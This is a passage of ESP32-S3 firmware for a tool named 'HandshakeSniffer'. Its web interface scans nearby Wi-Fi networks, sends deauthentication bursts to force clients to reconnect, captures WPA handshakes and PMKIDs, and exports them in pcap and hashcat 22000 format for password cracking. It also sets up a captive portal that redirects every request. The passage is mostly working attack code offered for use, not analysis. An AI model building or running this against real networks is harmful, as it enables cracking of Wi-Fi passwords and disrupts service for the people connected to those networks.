    out += "*" + String(cli);
    out += "*" + ssidHex;
    out += "***\n";
  }

  if (hs.m1 && hs.m2 && !macZero(hs.ap_mac)) {
    uint8_t mic_data_copy[128];
    memcpy(mic_data_copy, hs.mic_data, hs.mic_data_len);
    if (hs.mic_data_len > EAPOL_MIC_OFFSET + 16)
      memset(mic_data_copy + EAPOL_MIC_OFFSET, 0, 16);

    out += "WPA*02*";
    out += hexStr(hs.mic, 16);
    out += "*" + String(ap);
    out += "*" + String(cli);
    out += "*" + ssidHex;
    out += "*" + hexStr(hs.anonce, 32);
    out += "*" + hexStr(mic_data_copy, hs.mic_data_len);
    out += "*" + hexStr(hs.rsnie, hs.rsnie_len);
    out += "*02\n";
  }

  if (out.length() == 0) out = "# No crackable handshake yet\n";
  return out;
}

// ─── JSON METADATA ────────────────────────────────────────────────────────────
String buildJSON() {
  if (xSemaphoreTake(g_hsMutex, SEM_TIMEOUT) != pdTRUE) return "{}";
  HandshakeState hs = g_hs;
  xSemaphoreGive(g_hsMutex);

  char ap[18], cli[18];
  mac2str(hs.ap_mac,  ap);
  mac2str(hs.cli_mac, cli);

  char pmkidHex[33] = "";
  if (hs.pmkid) bytesToHex(hs.pmkid_bytes, 16, pmkidHex);

  // Escape SSID for JSON: backslash, quote, control chars
  char ssidEsc[132] = "";
  {
    int o = 0;
    for (int i = 0; g_targetSSID[i] && i < 32 && o < 128; i++) {
      uint8_t c = (uint8_t)g_targetSSID[i];
      if      (c == '"')  { ssidEsc[o++] = '\\'; ssidEsc[o++] = '"';  }
      else if (c == '\\') { ssidEsc[o++] = '\\'; ssidEsc[o++] = '\\'; }
      else if (c < 0x20)  { ssidEsc[o++] = '?'; }
      else                { ssidEsc[o++] = (char)c; }
    }
    ssidEsc[o] = '\0';
  }

  // Snapshot capLen under mutex
  size_t capBytes = 0;
  if (g_capMutex && xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
    capBytes = g_capLen;
    xSemaphoreGive(g_capMutex);
  }

  char json[512];
  snprintf(json, sizeof(json),
    "{"
    "\"ssid\":\"%s\","
    "\"ap_mac\":\"%s\","
    "\"cli_mac\":\"%s\","
    "\"channel\":%d,"
    "\"cap_bytes\":%u,"
    "\"m1\":%s,\"m2\":%s,\"m3\":%s,\"m4\":%s,"
    "\"pmkid\":%s,"
    "\"pmkid_hex\":\"%s\","
    "\"crackable\":%s"
    "}",
    ssidEsc, ap, cli, g_targetChannel, (unsigned)capBytes,
    hs.m1?"true":"false", hs.m2?"true":"false",
    hs.m3?"true":"false", hs.m4?"true":"false",
    hs.pmkid?"true":"false", pmkidHex,
    ((hs.m1&&hs.m2)||hs.pmkid)?"true":"false");

  return String(json);
}

// ─── WEB UI HTML ─────────────────────────────────────────────────────────────
static const char INDEX_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>HandshakeSniffer v1.3</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d1117;color:#e6edf3;font-family:'Segoe UI',Arial,sans-serif;min-height:100vh}
header{background:#161b22;border-bottom:1px solid #30363d;padding:14px 20px;display:flex;align-items:center;gap:12px}
header h1{font-size:1.2rem;font-weight:600;color:#58a6ff}
header .sub{font-size:0.78rem;color:#8b949e}
.badge{background:#388bfd22;color:#58a6ff;border:1px solid #388bfd55;border-radius:12px;padding:2px 10px;font-size:0.72rem}
main{max-width:1000px;margin:0 auto;padding:18px 12px}
.card{background:#161b22;border:1px solid #30363d;border-radius:8px;margin-bottom:16px;overflow:hidden}
.card-head{padding:12px 16px;background:#1c2128;border-bottom:1px solid #30363d;display:flex;align-items:center;justify-content:space-between}
.card-head h2{font-size:0.95rem;font-weight:600;color:#c9d1d9}
.card-body{padding:14px 16px}
button{border:none;border-radius:6px;padding:6px 14px;font-size:0.82rem;cursor:pointer;font-weight:500;transition:opacity .15s}
button:hover{opacity:.85}
.btn-primary{background:#238636;color:#fff}
.btn-danger{background:#da3633;color:#fff}
.btn-warn{background:#9e6a03;color:#fff}
.btn-sel{background:#0d419d;color:#fff;padding:4px 10px;font-size:0.75rem}
.btn-dl{background:#1f6feb;color:#fff}
.btn-sm{padding:4px 10px;font-size:0.75rem}
.row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
table{width:100%;border-collapse:collapse;font-size:0.82rem}
th{background:#0d1117;color:#8b949e;font-weight:500;text-align:left;padding:8px 10px;border-bottom:1px solid #30363d}
td{padding:7px 10px;border-bottom:1px solid #21262d;vertical-align:middle}
tr:last-child td{border-bottom:none}
tr:hover td{background:#1c2128}
.status-box{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:10px 14px;font-size:0.82rem}
.s-row{display:flex;gap:16px;flex-wrap:wrap;margin-bottom:6px}
.s-kv{display:flex;flex-direction:column;min-width:80px}
.s-k{font-size:0.7rem;color:#8b949e;margin-bottom:2px}
.s-v{font-size:0.9rem;font-weight:600}
.ok{color:#3fb950}.warn{color:#d29922}.bad{color:#f85149}.na{color:#8b949e}
.log-box{background:#0d1117;border:1px solid #21262d;border-radius:6px;padding:8px 10px;
  height:140px;overflow-y:auto;font-family:monospace;font-size:0.78rem;color:#8b949e}
.log-box p{padding:1px 0;border-bottom:1px solid #21262d22}
.log-box p:last-child{border:none}
.ts{color:#388bfd;margin-right:6px}
.target-info{background:#1c2128;border:1px solid #30363d;border-radius:6px;padding:8px 12px;font-size:0.82rem;color:#c9d1d9}
.mono{font-family:monospace;font-size:0.78rem}
.chip{display:inline-block;border-radius:10px;padding:1px 8px;font-size:0.72rem;font-weight:600;margin-left:6px}
.chip-yes{background:#238636;color:#fff}
.chip-no{background:#21262d;color:#8b949e}
@media(max-width:600px){.s-row{gap:10px}.s-kv{min-width:60px}}
</style>
</head>
<body>
<header>
  <div>
    <h1>🦈 HandshakeSniffer v1.3</h1>
    <div class="sub">ESP32-S3 · WPA/WPA2/WPA3 EAPOL + PMKID · Passive capture</div>
  </div>
  <span class="badge" id="capBadge">IDLE</span>
</header>
<main>

<!-- TARGET + CONTROLS -->
<div class="card">
  <div class="card-head">
    <h2>Target &amp; Capture</h2>
    <div class="row">
      <button class="btn-primary btn-sm" onclick="triggerScan()">Scan APs</button>
    </div>
  </div>
  <div class="card-body">
    <div class="target-info" id="targetBox">
      <span style="color:#8b949e">No target selected — scan APs below and click Select</span>
    </div>
    <div class="row" style="margin-top:10px">
      <button class="btn-primary" id="btnStart"  onclick="startCapture()" disabled>▶ Start Capture</button>
      <button class="btn-danger"  id="btnStop"   onclick="stopCapture()"  disabled>■ Stop</button>
      <button class="btn-warn"    id="btnDeauth" onclick="sendDeauth()"   disabled>⚡ Deauth &amp; Capture</button>
      <button class="btn-sm" style="background:#21262d;color:#c9d1d9" onclick="clearBuf()">🗑 Clear Buffer</button>
      <button class="btn-sm" style="background:#21262d;color:#c9d1d9" onclick="resetHs()">↺ Reset HS</button>
      <label style="font-size:0.78rem;color:#8b949e">Bursts:
        <select id="burstSel" style="background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;padding:2px 6px;font-size:0.78rem">
          <option value="3">3</option>
          <option value="5" selected>5</option>
          <option value="10">10</option>
          <option value="20">20</option>
          <option value="30">30</option>
          <option value="50">50</option>
        </select>
      </label>
      <label style="display:flex;align-items:center;gap:5px;font-size:0.78rem;color:#8b949e">
        <input type="checkbox" id="filterChk" checked> Filter BSSID
      </label>
    </div>
  </div>
</div>

<!-- HANDSHAKE STATUS -->
<div class="card">
  <div class="card-head"><h2>Handshake Status</h2></div>
  <div class="card-body">
    <div class="status-box">
      <div class="s-row">
        <div class="s-kv"><div class="s-k">M1 (ANonce)</div><div class="s-v" id="sM1">—</div></div>
        <div class="s-kv"><div class="s-k">M2 (SNonce+MIC)</div><div class="s-v" id="sM2">—</div></div>
        <div class="s-kv"><div class="s-k">M3</div><div class="s-v" id="sM3">—</div></div>
        <div class="s-kv"><div class="s-k">M4</div><div class="s-v" id="sM4">—</div></div>
        <div class="s-kv"><div class="s-k">PMKID</div><div class="s-v" id="sPmkid">—</div></div>
        <div class="s-kv"><div class="s-k">Crackable</div><div class="s-v" id="sCrack">—</div></div>
        <div class="s-kv"><div class="s-k">Cap Bytes</div><div class="s-v" id="sBytes">—</div></div>
      </div>
    </div>
    <div class="row" style="margin-top:10px">
      <button class="btn-dl" onclick="download('/dl_pcap','handshake.pcap')">⬇ PCAP</button>
      <button class="btn-dl" onclick="download('/dl_22000','handshake.22000')">⬇ hashcat 22000</button>
      <button class="btn-dl" onclick="download('/dl_json','capture.json')">⬇ JSON</button>
    </div>
  </div>
</div>

<!-- SCAN RESULTS -->
<div class="card">
  <div class="card-head">
    <h2>Nearby Networks</h2>
    <span id="scanStatus" style="font-size:0.78rem;color:#8b949e"></span>
  </div>
  <div class="card-body" style="padding:0">
    <table>
      <thead><tr><th>#</th><th>SSID</th><th>BSSID</th><th>CH</th><th>RSSI</th><th>ENC</th><th>Action</th></tr></thead>
      <tbody id="scanBody"><tr><td colspan="7" style="text-align:center;color:#8b949e;padding:20px">
        Click "Scan APs" to discover nearby networks
      </td></tr></tbody>
    </table>
  </div>
</div>

<!-- LOG -->
<div class="card">
  <div class="card-head">
    <h2>Event Log</h2>
    <button class="btn-sm" style="background:#21262d;color:#c9d1d9" onclick="clearLog()">Clear</button>
  </div>
  <div class="card-body" style="padding:8px 10px">
    <div class="log-box" id="logBox"></div>
  </div>
</div>

</main>
<script>
let selBSSID='', selCH=0, selSSID='', capturing=false;

function selectTarget(bssid, ch, ssid) {
  selBSSID=bssid; selCH=ch; selSSID=ssid||'';
  document.getElementById('targetBox').innerHTML =
    '<b>' + (ssid||'[Hidden]') + '</b>'
    + ' &nbsp;<span class="mono" style="color:#8b949e">' + bssid + '</span>'
    + ' &nbsp;CH&nbsp;<b>' + ch + '</b>';
  document.getElementById('btnStart').disabled  = false;
  document.getElementById('btnDeauth').disabled = false;
}

function triggerScan() {
  document.getElementById('scanStatus').textContent = 'Scanning\u2026';
  document.getElementById('scanBody').innerHTML =
    '<tr><td colspan="7" style="text-align:center;color:#8b949e;padding:16px">Scanning\u2026</td></tr>';
  fetch('/scan_trigger').then(()=>pollScan());
}

function pollScan() {
  fetch('/scan').then(r=>r.text()).then(html=>{
    if(html==='SCANNING'){setTimeout(pollScan,1200);return;}
    document.getElementById('scanBody').innerHTML = html;
    document.getElementById('scanStatus').textContent = '';
  });
}

function startCapture() {
  if(!selBSSID){alert('Select a target first');return;}
  let filter = document.getElementById('filterChk').checked ? 1 : 0;
  fetch('/start_capture?bssid='+selBSSID+'&ch='+selCH+'&ssid='+encodeURIComponent(selSSID)+'&filter='+filter)
    .then(r=>r.text()).then(()=>{
      capturing=true;
      document.getElementById('btnStart').disabled=true;
      document.getElementById('btnStop').disabled=false;
      document.getElementById('capBadge').textContent='CAPTURING';
      document.getElementById('capBadge').style.background='#da363322';
      document.getElementById('capBadge').style.color='#f85149';
    });
}

function stopCapture() {
  fetch('/stop_capture').then(r=>r.text()).then(()=>{
    capturing=false;
    document.getElementById('btnStart').disabled=false;
    document.getElementById('btnStop').disabled=true;
    document.getElementById('capBadge').textContent='IDLE';
    document.getElementById('capBadge').style.background='';
    document.getElementById('capBadge').style.color='';
  });
}

function sendDeauth() {
  if(!selBSSID){alert('Select a target first');return;}
  let bursts = document.getElementById('burstSel').value;
  if(!capturing) startCapture();
  setTimeout(()=>{
    fetch('/deauth?bssid='+selBSSID+'&ch='+selCH+'&bursts='+bursts)
      .then(r=>r.text()).then(t=>console.log('deauth:',t));
  }, 600);
}

function download(url, filename) {
  let a=document.createElement('a');
  a.href=url; a.download=filename; document.body.appendChild(a); a.click(); a.remove();
}

function clearLog() {
  document.getElementById('logBox').innerHTML='';
  logSeen.clear();
}

function clearBuf() {
  fetch('/clear').then(r=>r.text()).then(t=>{
    logSeen.clear();
    document.getElementById('logBox').innerHTML='';
    console.log('clear:', t);
    refreshStatus();
  });
}

function resetHs() {
  fetch('/reset_hs').then(r=>r.text()).then(t=>{
    console.log('reset_hs:', t);
    refreshStatus();
  });
}

// O(1) dedup via Set — the old array .includes() was O(n) and slowed down at 200 lines
const logSeen = new Set();
function refreshStatus() {
  fetch('/status').then(r=>r.json()).then(d=>{
    let ok='<span class="ok">\u2714</span>', no='<span class="na">\u2014</span>';
    document.getElementById('sM1').innerHTML    = d.m1    ? ok : no;
    document.getElementById('sM2').innerHTML    = d.m2    ? ok : no;
    document.getElementById('sM3').innerHTML    = d.m3    ? ok : no;
    document.getElementById('sM4').innerHTML    = d.m4    ? ok : no;
    document.getElementById('sPmkid').innerHTML = d.pmkid ? ok : no;
    let crack = (d.m1&&d.m2)||d.pmkid;
    document.getElementById('sCrack').innerHTML =
      crack ? '<span class="ok">YES</span>' : '<span class="na">No</span>';
    document.getElementById('sBytes').textContent = d.cap_bytes
      ? (d.cap_bytes >= 1024 ? (d.cap_bytes/1024).toFixed(1)+'KB' : d.cap_bytes+'B')
      : '0';
    if(d.capturing) {
      document.getElementById('capBadge').textContent='CAPTURING';
    }
  }).catch(()=>{});

  fetch('/log').then(r=>r.text()).then(txt=>{
    if(!txt.trim()) return;
    let box=document.getElementById('logBox');
    txt.trim().split('\n').forEach(line=>{
      if(!logSeen.has(line)){
        logSeen.add(line);
        if(logSeen.size>200){
          // evict oldest: delete first entry from Set
          logSeen.delete(logSeen.values().next().value);
        }
        let p=document.createElement('p');
        let m=line.match(/^(\d+)s\s+(.*)/);
        if(m) p.innerHTML='<span class="ts">'+m[1]+'s</span>'+m[2];
        else  p.textContent=line;
        box.appendChild(p);
      }
    });
    box.scrollTop=box.scrollHeight;
  }).catch(()=>{});
}

setInterval(refreshStatus, 1500);
refreshStatus();
</script>
</body>
</html>
)rawliteral";

// ─── SERVER SETUP ─────────────────────────────────────────────────────────────
void setupServer() {
  server.on("/", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->send_P(200, "text/html", INDEX_HTML);
  });

  // ── SCAN ──────────────────────────────────────────────────────────────────
  server.on("/scan_trigger", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (g_scanBusy) { r->send(200,"text/plain","SCANNING"); return; }
    g_scanBusy = true;
    if (g_scanMutex && xSemaphoreTake(g_scanMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
      g_scanCache = ""; xSemaphoreGive(g_scanMutex);
    }
    xTaskCreatePinnedToCore(scan_task, "scan", 6144, NULL, 1, NULL, 0);
    r->send(200, "text/plain", "SCANNING");
  });

  server.on("/scan", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (g_scanBusy) { r->send(200,"text/html","SCANNING"); return; }
    String result = "";
    if (g_scanMutex && xSemaphoreTake(g_scanMutex, pdMS_TO_TICKS(300)) == pdTRUE) {
      result = g_scanCache; xSemaphoreGive(g_scanMutex);
    }
    if (result.length() == 0) {
      // Cache empty but not busy — spawn a scan only if truly not running
      // Use compare-and-set pattern: set g_scanBusy only if it was false
      bool expected = false;
      if (__atomic_compare_exchange_n((bool*)&g_scanBusy, &expected, true, false,
                                      __ATOMIC_SEQ_CST, __ATOMIC_SEQ_CST)) {
        xTaskCreatePinnedToCore(scan_task, "scan", 6144, NULL, 1, NULL, 0);
      }
      r->send(200,"text/html","SCANNING"); return;
    }
    r->send(200, "text/html", result);
  });

  // ── START CAPTURE ────────────────────────────────────────────────────────
  server.on("/start_capture", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (g_promiscRunning) {
      r->send(409,"text/plain","Already capturing — stop first"); return;
    }
    if (!r->hasParam("bssid") || !r->hasParam("ch")) {
      r->send(400,"text/plain","bssid+ch required"); return;
    }

    String bssidStr = r->getParam("bssid")->value();
    int    ch       = r->getParam("ch")->value().toInt();
    String ssid     = r->hasParam("ssid") ? r->getParam("ssid")->value() : "";
    bool   filter   = r->hasParam("filter") && r->getParam("filter")->value() == "1";

    if (ch < 1 || ch > 14) { r->send(400,"text/plain","Bad channel"); return; }

    uint8_t bssid[6] = {0};
    bool    hasBSSID = (bssidStr.length() == 17);
    if (hasBSSID) {
      sscanf(bssidStr.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
             &bssid[0],&bssid[1],&bssid[2],&bssid[3],&bssid[4],&bssid[5]);
    }

    startCapture(ch, hasBSSID ? bssid : nullptr, ssid.c_str(), filter);
    r->send(200,"text/plain","Capture started ch" + String(ch) + " " + bssidStr);
  });

  // ── STOP CAPTURE ─────────────────────────────────────────────────────────
  server.on("/stop_capture", HTTP_GET, [](AsyncWebServerRequest* r) {
    stopCapture();
    r->send(200,"text/plain","Stopped");
  });

  // ── CLEAR BUFFER ─────────────────────────────────────────────────────────
  // Resets PCAP buffer + handshake state. Capture stays active if running.
  // Use this mid-session to discard a partial/bad capture and start fresh
  // without having to stop and restart the sniffer.
  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (g_capMutex && xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
      g_capLen = 0;
      if (g_capBuf) {
        PcapGlobalHdr gh = {0xa1b2c3d4u, 2, 4, 0, 0, 65535, 127};
        memcpy(g_capBuf, &gh, sizeof(gh));
        g_capLen = sizeof(gh);
      }
      xSemaphoreGive(g_capMutex);
    }
    if (g_hsMutex && xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
      memset(&g_hs, 0, sizeof(g_hs));
      xSemaphoreGive(g_hsMutex);
    }
    logEvent("Buffer + handshake state cleared");
    r->send(200,"text/plain","Cleared — PCAP and handshake state reset");
  });

  // ── RESET HANDSHAKE STATE ONLY ────────────────────────────────────────────
  // Clears EAPOL message flags (M1/M2/M3/M4, PMKID, MACs) without discarding
  // the raw PCAP buffer. Useful to re-arm for a new client without losing
  // previously captured packets.
  server.on("/reset_hs", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (g_hsMutex && xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
      memset(&g_hs, 0, sizeof(g_hs));
      xSemaphoreGive(g_hsMutex);
    }
    logEvent("Handshake state reset — PCAP buffer preserved");
    r->send(200,"text/plain","Handshake state cleared — PCAP buffer preserved");
  });

  // ── DEAUTH ───────────────────────────────────────────────────────────────
  server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!r->hasParam("bssid") || !r->hasParam("ch")) {
      r->send(400,"text/plain","bssid+ch required"); return;
    }
    if (g_deauthRunning) { r->send(409,"text/plain","Deauth already running"); return; }
    // Guard: scan_task holds the radio — deauthating while scanning races on the
    // channel and promiscuous state. Reject until scan completes (<2s).
    if (g_scanBusy) { r->send(409,"text/plain","Scan in progress — retry in 2s"); return; }

    String bssidStr = r->getParam("bssid")->value();
    int    ch       = r->getParam("ch")->value().toInt();
    int    bursts   = r->hasParam("bursts") ? r->getParam("bursts")->value().toInt() : 5;

    if (bssidStr.length() != 17 || ch < 1 || ch > 14) {
      r->send(400,"text/plain","Bad params"); return;
    }

    uint8_t bssid[6];
    sscanf(bssidStr.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
           &bssid[0],&bssid[1],&bssid[2],&bssid[3],&bssid[4],&bssid[5]);
    memcpy(g_targetBSSID, bssid, 6);
    g_targetChannel  = ch;
    g_deauthBursts   = (bursts < 1) ? 1 : (bursts > 50) ? 50 : bursts;
    g_deauthRunning  = true;

    BaseType_t ok = xTaskCreatePinnedToCore(deauth_task, "deauth", 4096, NULL, 3,
                                            &g_deauthTask, 0);
    if (ok != pdPASS) {
      // Task create failed — must reset flag or device is stuck until reboot
      g_deauthRunning = false;
      g_deauthTask    = NULL;
      logEvent("FATAL: deauth task create failed");
      r->send(500,"text/plain","Task create failed — heap low?"); return;
    }
    r->send(200,"text/plain","Deauth started: " + bssidStr);
  });

  // ── STATUS ───────────────────────────────────────────────────────────────
  server.on("/status", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(200)) != pdTRUE) {
      r->send(503,"text/plain","mutex"); return;
    }
    HandshakeState hs = g_hs;
    xSemaphoreGive(g_hsMutex);

    // Snapshot capLen under mutex — not a naked read
    size_t capBytes = 0;
    if (g_capMutex && xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
      capBytes = g_capLen;
      xSemaphoreGive(g_capMutex);
    }

    bool crackable = (hs.m1 && hs.m2) || hs.pmkid;
    char buf[256];
    snprintf(buf, sizeof(buf),
      "{\"capturing\":%s,\"m1\":%s,\"m2\":%s,\"m3\":%s,\"m4\":%s,"
      "\"pmkid\":%s,\"crackable\":%s,\"cap_bytes\":%u}",
      g_capActive ? "true":"false",
      hs.m1?"true":"false", hs.m2?"true":"false",
      hs.m3?"true":"false", hs.m4?"true":"false",
      hs.pmkid?"true":"false",
      crackable?"true":"false",
      (unsigned)capBytes);
    r->send(200, "application/json", buf);
  });

  // ── LOG ──────────────────────────────────────────────────────────────────
  server.on("/log", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!g_logMutex || xSemaphoreTake(g_logMutex, pdMS_TO_TICKS(200)) != pdTRUE) {
      r->send(200,"text/plain",""); return;
    }
    String out;
    int start = (g_logCount < LOG_MAX) ? 0 : g_logHead;
    for (int i = 0; i < g_logCount; i++) {
      int idx = (start + i) % LOG_MAX;
      out += String(g_log[idx].ts / 1000) + "s  " + g_log[idx].msg + "\n";
    }
    xSemaphoreGive(g_logMutex);
    r->send(200,"text/plain",out);
  });

  // ── DOWNLOADS ────────────────────────────────────────────────────────────
  server.on("/dl_pcap", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!g_capBuf) {
      r->send(404,"text/plain","No capture buffer"); return;
    }
    // Snapshot length under mutex before serving
    size_t len = 0;
    if (g_capMutex && xSemaphoreTake(g_capMutex, SEM_TIMEOUT) == pdTRUE) {
      len = g_capLen;
      xSemaphoreGive(g_capMutex);
    }
    if (len <= sizeof(PcapGlobalHdr)) {
      r->send(404,"text/plain","No capture data. Start capture and trigger a handshake first."); return;
    }
    // Snapshot into heap buffer so async send can't race with live capture.
    // We use AsyncResponseStream instead of the beginResponse(code,type,filler,len)
    // overload because ESP32Async ESPAsyncWebServer v3.x swapped the last two
    // args to (code,type,len,filler) — using AsyncResponseStream avoids the
    // arg-order ambiguity and compiles cleanly on all supported versions.
    uint8_t* snap = (uint8_t*)malloc(len);
    if (!snap) { r->send(500,"text/plain","OOM"); return; }
    memcpy(snap, g_capBuf, len);
    AsyncResponseStream* rs = r->beginResponseStream("application/octet-stream");
    rs->addHeader("Content-Disposition", "attachment; filename=\"handshake.pcap\"");
    rs->write(snap, len);
    free(snap);
    r->send(rs);
    logEvent("PCAP served: %u bytes", (unsigned)len);
  });

  server.on("/dl_22000", HTTP_GET, [](AsyncWebServerRequest* r) {
    String out = build22000();
    // Use send() directly with String body — unambiguous in all ESPAsyncWebServer versions
    AsyncWebServerResponse* resp = r->beginResponse(200, "text/plain", out);
    resp->addHeader("Content-Disposition", "attachment; filename=\"handshake.22000\"");
    r->send(resp);
    logEvent("22000 served");
  });

  server.on("/dl_json", HTTP_GET, [](AsyncWebServerRequest* r) {
    String out = buildJSON();
    AsyncWebServerResponse* resp = r->beginResponse(200, "application/json", out);
    resp->addHeader("Content-Disposition", "attachment; filename=\"capture.json\"");
    r->send(resp);
  });

  // ── CAPTIVE PORTAL DETECTION ENDPOINTS ───────────────────────────────────
  // Each OS probes a different URL to decide whether to show the portal popup.
  // We must respond correctly (not just redirect) or the OS marks the network
  // as "no internet" and suppresses the popup entirely.
  //
  // ── CAPTIVE PORTAL DETECTION ──────────────────────────────────────────────
  // Strategy: REDIRECT every OS probe to our web UI.
  //
  // Returning the "expected" body (e.g. "Success", "Microsoft NCSI") tells
  // the OS it has real internet access → popup is SUPPRESSED.
  // Returning a 302 redirect tells the OS "captive portal detected" →
  // OS shows the "Sign in to network" popup/notification automatically.
  //
  // Android /generate_204 is the exception: 204 = captive portal signal
  // (Android specifically uses "no content" as the captive portal trigger,
  //  unlike every other OS which uses redirect detection).
  //
  // Platform → probe URL → our response
  // iOS 14+    /hotspot-detect.html         → 302 redirect
  // iOS 14+    /library/test/success.html   → 302 redirect
  // iOS 16+    /bag                         → 302 redirect
  // macOS      /hotspot-detect.html         → 302 redirect
  // macOS      /library/test/success.html   → 302 redirect
  // Android    /generate_204                → 204 (triggers notification)
  // Android    /gen_204                     → 204
  // Android 7+ /connectivity-check.html     → 302 redirect
  // Windows    /ncsi.txt                    → 302 redirect
  // Windows    /connecttest.txt             → 302 redirect
  // Windows    /redirect                    → 302 redirect
  // Firefox    /success.txt                 → 302 redirect
  // All other  *                            → 302 redirect (onNotFound)

  // iOS / macOS
  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->redirect("http://192.168.4.1/");
  });
  server.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->redirect("http://192.168.4.1/");
  });
  server.on("/bag", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->redirect("http://192.168.4.1/");
  });

  // Android — 204 is the correct captive portal signal on Android
  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->send(204, "text/plain", "");
  });
  server.on("/gen_204", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->send(204, "text/plain", "");
  });
  // Android 7+ Chromium check
  server.on("/connectivity-check.html", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->redirect("http://192.168.4.1/");
  });

  // Windows NCSI — redirect triggers captive portal detection
  server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->redirect("http://192.168.4.1/");
  });
  server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->redirect("http://192.168.4.1/");
  });
  server.on("/redirect", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->redirect("http://192.168.4.1/");
  });

  // Firefox
  server.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->redirect("http://192.168.4.1/");
  });

  // Proxy autoconfig probe (Windows / corporate devices)
  server.on("/wpad.dat", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->redirect("http://192.168.4.1/");
  });

  // Catch-all: ANY path not matched above → redirect to UI.
  // DNS already resolves every hostname to 192.168.4.1 so every
  // browser request (regardless of original domain) lands here.
  server.onNotFound([](AsyncWebServerRequest* r) {
    r->redirect("http://192.168.4.1/");
  });
}

// ─── SETUP ───────────────────────────────────────────────────────────────────
void setup() {
  Serial0.begin(115200);
  delay(200);
  Serial0.println("\n==========================================");
  Serial0.println("  HandshakeSniffer v1.3 — ESP32-S3");
  Serial0.println("==========================================\n");

  led.begin(); led.setBrightness(60); led.clear(); led.show();
  delay(10); setLed(LS_BLUE); updateLED();

  g_logMutex  = xSemaphoreCreateMutex();
  g_capMutex  = xSemaphoreCreateMutex();
  g_hsMutex   = xSemaphoreCreateMutex();
  g_scanMutex = xSemaphoreCreateMutex();
  if (!g_logMutex || !g_capMutex || !g_hsMutex || !g_scanMutex) {
    Serial0.println("[FATAL] Mutex init failed");
    setLed(LS_RED); updateLED();
    while (1) delay(1000);
  }

  if (psramFound()) {
    g_capBuf = (uint8_t*)heap_caps_malloc(CAP_BUF_SIZE, MALLOC_CAP_SPIRAM);
    if (g_capBuf) INFO("PSRAM cap buffer: %u KB", CAP_BUF_SIZE / 1024);
    else          ERR("PSRAM malloc failed — falling back to heap");
  }
  if (!g_capBuf) {
    g_capBuf = (uint8_t*)malloc(CAP_BUF_SIZE / 8);
    if (g_capBuf) INFO("Heap cap buffer: %u KB", CAP_BUF_SIZE / 8 / 1024);
    else {
      Serial0.println("[FATAL] No cap buffer");
      setLed(LS_RED); updateLED();
      while (1) delay(1000);
    }
  }

  esp_err_t nvs = nvs_flash_init();
  if (nvs == ESP_ERR_NVS_NO_FREE_PAGES || nvs == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    nvs_flash_erase(); nvs_flash_init();
  }

  // Country code — PH for ch 1-14
  auto applyCountry = []() {
    wifi_country_t cc;
    memset(&cc, 0, sizeof(cc));
    cc.cc[0]='P'; cc.cc[1]='H'; cc.cc[2]='\0';
    cc.schan=1; cc.nchan=13; cc.max_tx_power=20;
    cc.policy=WIFI_COUNTRY_POLICY_MANUAL;
    esp_wifi_set_country(&cc);
  };

  WiFi.persistent(false);
  WiFi.mode(WIFI_OFF); delay(200);
  WiFi.mode(WIFI_AP_STA); delay(300);
  applyCountry();  // apply after mode set — only needed once

  bool apOk = false;
  for (int i = 0; i < 8 && !apOk; i++) {
    apOk = WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL, 0, 4);
    if (!apOk) { delay(300); WiFi.mode(WIFI_OFF); delay(150); WiFi.mode(WIFI_AP_STA); delay(250); }
  }
  if (!apOk) apOk = WiFi.softAP("HS-OPEN", NULL, AP_CHANNEL, 0, 4);
  if (!apOk) {
    Serial0.println("[FATAL] softAP failed");
    setLed(LS_RED); updateLED();
    while (1) { updateLED(); delay(500); }
  }
  delay(300);

  esp_wifi_set_max_tx_power(MAX_TX_POWER);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_protocol(WIFI_IF_AP,  WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);

  setupServer();
  server.begin();

  // DNS: answer every query with our AP IP — makes captive portal fire on connect
